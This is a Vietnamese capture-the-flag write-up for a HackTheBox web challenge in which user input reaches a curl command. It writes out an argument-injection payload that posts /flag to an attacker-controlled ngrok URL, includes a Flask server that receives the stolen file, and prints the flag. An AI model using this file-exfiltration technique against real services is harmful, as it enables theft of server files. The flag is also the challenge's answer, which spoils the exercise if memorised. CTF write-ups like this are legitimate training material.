![alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_health_check/src/1.png)

bài này cũng không khó
ta thấy rằng web này cho ta dùng __curl trong linux__ để crawl đến web khác,  ta không thể thực hiện command injection vì hàm __escapeshellcmd($host)__ đã chặn.
![alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_health_check/src/3.png)
![alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_health_check/src/4.png)
<br />
nhưng  lệnh __curl__ trong linux có thể upload file đến một máy web khác bằng lệnh như sau __curl $url_attacker -X POST -F file=@@/đường_dẫn_file __ 
<br />
trong tệp __Dockerfile__ ta có thể thấy đường dẫn __/flag__
<br />
![alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_health_check/src/Untitled.png)

ta chạy web để bắt file được gửi về, có thể sử dụng đoạn mã python sau
```from flask import Flask, request

app = Flask(__name__)

@app.route('/upload', methods = [ 'POST'])
def upload_file():
    if request.method == 'POST':
      f = request.files['file']
      f.save(f.filename)
      return 'file uploaded successfully'

if __name__ == '__main__':
   app.run(host="0.0.0.0",port=8888)
   ``` 
   
sau đó nhập payload này:  ` http://2360-2001-ee0-4f0f-d3b0-910-70-84f3-2af0.ngrok.io/upload -X POST -F file=@/flag`
như vậy ta sẽ nhận tệp flag gửi về __HTB{curl_pwn4g3_3n_r0ut3!}__
<br /> dùng ngrok để tạo ra điểm truy cập cho chính máy của mình, ta sẽ có đoạn cái đường dẫn url này  ` http://2360-2001-ee0-4f0f-d3b0-910-70-84f3-2af0.ngrok.io `

[source của bài này](https://github.com/magnetohvcs/ctf/raw/main/ctf-hackthebox/Auth0-CTF/web_health_check/src/web_health_check.zip)
